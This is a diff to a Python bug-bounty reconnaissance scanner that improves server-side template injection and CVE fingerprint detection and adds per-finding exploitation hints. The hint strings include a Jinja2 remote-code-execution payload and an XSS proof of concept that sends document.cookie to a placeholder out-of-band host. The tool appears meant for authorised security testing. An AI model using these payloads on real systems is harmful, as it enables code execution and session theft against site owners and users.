@@ -86,7 +86,7 @@ Requirements:
 """
 
 import sys, ssl, json, socket, asyncio, datetime, subprocess, argparse, re, os, warnings, base64
-from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
+from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote, unquote
 from pathlib import Path
 from dataclasses import dataclass, field, asdict
 from typing import Optional
@@ -131,7 +131,7 @@ except ImportError:
     HAS_PLAYWRIGHT = False
 
 # ── Constants ─────────────────────────────────────────────────────────────────
-VERSION  = "4.1.0"
+VERSION  = "4.2.0"
 TIMEOUT  = 12
 UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
 BROWSER_HEADERS = {
@@ -933,47 +933,62 @@ def detect_open_redirects(base_url: str) -> list:
 
 # ── NEW: SSTI canary detection ────────────────────────────────────────────────
 def detect_ssti(base_url: str) -> list:
-    """
-    Inject SSTI canary payloads into discovered parameters.
-    Look for arithmetic result (49) reflected in response.
-    """
-    findings = []
+    """Differential SSTI probe — no fixed '49' (that false-positives constantly).
 
+    For each param we pick a RANDOM product a*b, then require three things before
+    we believe it: (1) the product value appears in the injected response,
+    (2) it is NOT present in a benign baseline response, and (3) neither the raw
+    payload nor the literal 'a*b' arithmetic is merely reflected. Only a genuinely
+    *evaluated* expression passes all three."""
+    findings = []
+    sep = "&" if "?" in base_url else "?"
     try:
         status, hdrs, body = http_get(base_url, timeout=10)
-        text = body.decode("utf-8","replace")
-
-        # Find query params on page
-        param_names = set()
-        for m in re.finditer(r'[?&]([a-zA-Z0-9_\-]{2,20})=', text):
-            param_names.add(m.group(1))
-
+        text = body.decode("utf-8", "replace")
+        param_names = set(m.group(1) for m in re.finditer(r'[?&]([a-zA-Z0-9_\-]{2,20})=', text))
         if not param_names:
             return findings
 
-        for param in list(param_names)[:5]:
-            for payload, expected, engine in SSTI_CANARIES:
-                probe = f"{base_url}{'&' if '?' in base_url else '?'}{param}={payload}"
-                try:
-                    st, _, b = http_get(probe, timeout=6)
-                    response_text = b.decode("utf-8","replace")
-                    if expected in response_text and payload not in response_text:
-                        findings.append({
-                            "severity": "High",
-                            "category": "ssti",
-                            "title": f"SSTI confirmed in parameter '{param}' ({engine})",
-                            "url": probe,
-                            "evidence": f"Payload {payload!r} → response contains '{expected}' (engine: {engine})",
-                            "command": f'curl -s "{probe}"',
-                            "remediation": "Never pass user input to template rendering engines. Use template sandboxing (tplmap for exploitation).",
-                        })
-                        break  # confirmed, skip other canaries for this param
-                except Exception:
-                    pass
+        engines = [("{{%d*%d}}", "Jinja2/Twig"), ("${%d*%d}", "Freemarker/Velocity/Spring"),
+                   ("<%%= %d*%d %%>", "ERB (Ruby)"), ("#{%d*%d}", "Ruby/Slim")]
 
+        for param in list(param_names)[:5]:
+            a, b = random.randint(211, 499), random.randint(211, 499)
+            product, arith = str(a * b), f"{a}*{b}"
+            marker = "zz" + "".join(random.choices(string.ascii_lowercase, k=6)) + "zz"
+            # baseline — benign value; if the product already appears here, bail (coincidence)
+            try:
+                _, _, bb = http_get(f"{base_url}{sep}{param}={marker}", timeout=6)
+                baseline = bb.decode("utf-8", "replace")
+            except Exception:
+                baseline = ""
+            if product in baseline:
+                continue
+
+            for tmpl, engine in engines:
+                payload = tmpl % (a, b)
+                probe = f"{base_url}{sep}{param}={quote(payload)}"
+                try:
+                    _, _, pb = http_get(probe, timeout=6)
+                    rt = pb.decode("utf-8", "replace")
+                except Exception:
+                    continue
+                evaluated = (product in rt) and (payload not in rt) and (arith not in rt)
+                if evaluated:
+                    findings.append({
+                        "severity": "High", "category": "ssti",
+                        "title": f"SSTI in parameter '{param}' ({engine})",
+                        "url": probe,
+                        "evidence": (f"{param}={payload} → response contains the computed product "
+                                     f"'{product}' while the literal payload and raw '{arith}' are "
+                                     f"absent (expression was evaluated, not reflected)."),
+                        "command": f'curl -s "{probe}"',
+                        "remediation": "Never render user input through a template engine; sandbox or "
+                                       "pre-escape. Confirm/escalate with tplmap or SSTImap.",
+                    })
+                    break
     except Exception:
         pass
-
     return findings
 
 # ── NEW: Prototype Pollution detection ────────────────────────────────────────
@@ -1842,29 +1857,90 @@ def parse_nuclei_jsonl(text: str) -> list:
             "remediation":info.get("remediation","")})
     return findings
 
+def _norm_body(raw: bytes) -> str:
+    """Letters-only, lowercased, length-capped signature of a body.
+    Two responses with the same signature are the 'same page' regardless of the
+    path echoed into them — this is how we detect SPA / catch-all responses."""
+    txt = raw[:8000].decode("utf-8", errors="replace").lower()
+    return re.sub(r"[^a-z]", "", txt)[:2000]
+
+_ERROR_BODY_RE = re.compile(
+    r'("status(code)?"\s*:\s*[45]\d\d|'          # {"statuscode":404 ...}
+    r'"error"\s*:\s*(true|"not\s*found")|'        # {"error":"not found"}
+    r'\b404\b.{0,15}not\s*found|'                 # 404 Not Found
+    r'page\s+not\s+found|'
+    r'\bnginx\b.{0,40}(not\s*found|bad\s*gateway|forbidden))', re.I)
+
 def check_cve_fingerprints(base_url: str) -> list:
+    """Fingerprint known-vulnerable products — with aggressive FP suppression.
+
+    Kills the three classic false positives: (1) catch-all 404 JSON/HTML that
+    echoes the requested path (so '/moveit/' 'matches' 'MOVEit'); (2) SPA index
+    served for every path; (3) weak keywords matching as substrings ('nable' in
+    'enable'). We only flag when a REAL product page answers — not an error page."""
     findings = []
     base = base_url.rstrip("/")
+
+    # ── per-host baseline: hit a random path to learn the catch-all response ──
+    rnd = "/zz" + "".join(random.choices(string.ascii_lowercase, k=14)) + "zz"
+    base_status, base_sig = None, None
+    try:
+        bs, _bh, bb = http_get(base + rnd, follow=False, timeout=8)
+        base_status, base_sig = bs, _norm_body(bb)
+    except Exception:
+        pass
+
     for check in CVE_CHECKS:
-        matched_url = matched_on = matched_body = None
+        hit = None
         for path in check["paths"]:
             url = base + path
             try:
                 status, hdrs, body = http_get(url, follow=False, timeout=8)
-                h = norm_headers(hdrs)
-                decoded = body[:4000].decode("utf-8", errors="replace").lower()
-                header_str = " ".join(f"{k}: {v}" for k,v in h.items()).lower()
-                combined = decoded + " " + header_str
-                for keyword in check["match"]:
-                    if keyword.lower() in combined:
-                        matched_url = url; matched_on = keyword; matched_body = decoded[:200].replace("\n"," ").strip(); break
-                if matched_url: break
-            except Exception: continue
-        if matched_url:
-            findings.append({"severity":check["severity"],"category":"cve-fingerprint",
-                "title":f"{check['cve']} — {check['product']}","url":matched_url,
-                "evidence":f"Fingerprint: '{matched_on}' | URL: {matched_url} | Body: {matched_body[:150]}",
-                "command":f'curl -si "{matched_url}"',"remediation":check["remediation"]})
+            except Exception:
+                continue
+
+            # 1) reject hard error / not-found statuses outright
+            if status in (404, 410) or status >= 500:
+                continue
+
+            decoded = body[:8000].decode("utf-8", errors="replace").lower()
+            sig = _norm_body(body)
+
+            # 2) reject catch-all: same body signature as the random baseline
+            if base_sig and sig == base_sig and (base_status is None or status == base_status):
+                continue
+            # 3) reject bodies that announce themselves as errors / not-found
+            if _ERROR_BODY_RE.search(decoded):
+                continue
+
+            # 4) strip the echoed request path so path-echo can't match keywords
+            variants = {path.lower(), unquote(path).lower()}
+            variants |= {seg for p in list(variants) for seg in re.split(r"[/_.\-]", p) if len(seg) > 3}
+            stripped = decoded
+            for v in sorted(variants, key=len, reverse=True):
+                if v:
+                    stripped = stripped.replace(v, " ")
+            h = norm_headers(hdrs)
+            header_str = " ".join(f"{k}: {v}" for k, v in h.items()).lower()
+            text = stripped + " " + header_str
+
+            # 5) match keywords with word boundaries (no substring bleed)
+            for keyword in check["match"]:
+                k = keyword.lower()
+                if re.search(r"(?<![a-z0-9])" + re.escape(k) + r"(?![a-z0-9])", text):
+                    snippet = decoded[:200].replace("\n", " ").strip()
+                    hit = (url, keyword, snippet, status)
+                    break
+            if hit:
+                break
+
+        if hit:
+            url, matched_on, matched_body, status = hit
+            findings.append({"severity": check["severity"], "category": "cve-fingerprint",
+                "title": f"{check['cve']} — {check['product']}", "url": url,
+                "evidence": (f"Fingerprint '{matched_on}' in a live {status} response "
+                             f"(not a 404/catch-all). Body: {matched_body[:150]}"),
+                "command": f'curl -si "{url}"', "remediation": check["remediation"]})
     return findings
 
 # ── NEW (v4.0): Cache-poisoning / Host-override reflection ────────────────────
@@ -2069,9 +2145,21 @@ def exploitation_for(f: dict, domain: str) -> dict:
 
     if cat == "ssti":
         return _exp("yes", "Server-side template injection → RCE on most engines.",
-            [f'Confirm arithmetic executed (49 reflected): {url}',
-             "Escalate per engine (Jinja2 example): {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-             "Automate with tplmap; report the command output as proof."])
+            [f'Re-confirm the computed product is reflected (not the literal payload): curl -s "{url}"',
+             "Identify the engine: {{7*7}}=49 Jinja2/Twig · ${7*7}=49 Freemarker/Spring · <%= 7*7 %>=49 ERB",
+             "Jinja2 RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+             "Automate with tplmap / SSTImap; put the `id` command output in the report as proof."])
+
+    if cat == "xss":
+        stored = "stored" in (f.get("title", "") + ev).lower()
+        return _exp("manual",
+            "Session/credential theft, actions-as-victim, or ATO when it fires in an authed/admin view.",
+            [f'Reflect a unique marker first (no alert): curl -s "{url}" | grep -o "zzmarkerzz"  # prove the sink',
+             "Confirm execution in a real browser; context decides the payload "
+             "(HTML: <svg onload=...> · attribute: \"><svg/onload=...> · JS string: ';alert(1)//).",
+             "Impact PoC (not alert(1)): <img src=x onerror=\"fetch('https://OOB?c='+btoa(document.cookie))\">",
+             ("Stored: show it executes for a DIFFERENT user/session than the one who injected it."
+              if stored else "If reflected, check it is not Self-XSS — it must fire without the victim pasting anything.")])
 
     if cat == "graphql":
         return _exp("manual", "Schema disclosure → find unauth mutations / IDOR; batching → brute/rate-limit bypass.",
@@ -2121,8 +2209,14 @@ def exploitation_for(f: dict, domain: str) -> dict:
                 ["Open the generated clickjacking PoC HTML; does the page frame?",
                  "Find a sensitive one-click action (delete, transfer, change email) that works framed.",
                  "Only THEN is it reportable — bare 'missing X-Frame-Options' is not."], poc="clickjack")
+        csp_absent = "content-security-policy" in ev
+        steps = [f'Confirm which headers are absent: curl -sI "{url}"']
+        if csp_absent:
+            steps.append("No CSP means an injection here isn't mitigated — go HUNT a reflected/stored "
+                         "XSS on this host; the XSS is the bug, missing-CSP is just why it works.")
+        steps.append("Do not submit the missing header alone — it's rejected as a hardening gap.")
         return _exp("no", "Missing security headers are hardening gaps; not an independently rewardable bug.",
-            ["Do not submit alone. Use only as supporting context inside a real XSS/clickjacking report."])
+            steps)
 
     if cat in ("tls","dns-sec","cookies","waf","idn-homoglyph"):
         return _exp("no", "Best-practice / hardening finding — generally out of scope or non-paying on its own.",
@@ -2647,16 +2741,23 @@ def print_finding(f: dict):
     ev  = (f.get("evidence") or f.get("snippet") or "")[:100]
     exp = f.get("exploit") or {}
     vlabel = VERDICT_LABEL.get(exp.get("verdict",""), "")
+    # Show the "how to verify / exploit" steps in the terminal for anything worth
+    # chasing (confirmed or needs-manual-proof). Skip the rejected 'no' verdicts.
+    steps = exp.get("steps", []) if exp.get("verdict") in ("yes", "manual") else []
     if HAS_RICH:
         console.print(f"  {em} [bold]{sev}[/bold] {t}")
         if url: console.print(f"     [cyan]{url}[/cyan]")
         if ev:  console.print(f"     [green]{ev}[/green]")
         if vlabel: console.print(f"     [magenta]{vlabel}[/magenta] — {exp.get('impact','')}")
+        for s in steps[:4]:
+            console.print(f"     [yellow]↳[/yellow] {s}")
     else:
         print(f"  {em} [{sev}] {t}")
         if url: print(f"     {url}")
         if ev:  print(f"     {ev}")
         if vlabel: print(f"     {vlabel} — {exp.get('impact','')}")
+        for s in steps[:4]:
+            print(f"     ↳ {s}")
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  AI TRIAGE  (folded in from the former claude_hunter.py + artemis_triage.py)
@@ -2914,7 +3015,7 @@ def main():
             f"Threads  : {HTTP_CFG['threads']}   Rate: {HTTP_CFG['rate'] or 'unlimited'} req/s   Retries: {HTTP_CFG['retries']}\n"
             f"Modules  : {', '.join(mods_on) if mods_on else 'core only'}"
             f"{warn}",
-            title="🔍 Bug Bounty Recon v4.0 — authorised targets only"))
+            title=f"🔍 Bug Bounty Recon v{VERSION} — authorised targets only"))
     else:
         print(f"\n{'='*55}\nbounty_recon.py v{VERSION} | {domain} | profile={prof}\n{'='*55}")
         if injection_on:
